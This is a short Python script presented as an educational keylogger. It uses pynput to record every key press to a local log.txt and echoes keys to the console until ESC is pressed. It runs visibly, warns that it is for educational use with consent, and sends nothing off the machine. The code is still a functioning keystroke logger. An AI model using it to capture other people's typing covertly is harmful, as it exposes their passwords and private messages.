"""
Educational Keyboard Event Logger
---------------------------------
This script demonstrates how to listen to keyboard events using pynput.
Run this script ONLY with your own knowledge and consent.

Press ESC to stop logging.
"""

from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(str(key))
    write_file(keys)

    try:
        print(f"Alphanumeric key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")

def write_file(keys):
    with open("log.txt", "w") as file:
        for key in keys:
            cleaned_key = key.replace("'", "")
            file.write(cleaned_key + " ")

def on_release(key):
    print(f"{key} released")
    if key == Key.esc:
        print("ESC pressed. Exiting...")
        return False

print("⚠️ This program logs keystrokes for EDUCATIONAL purposes only.")
print("Press ESC to stop.\n")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()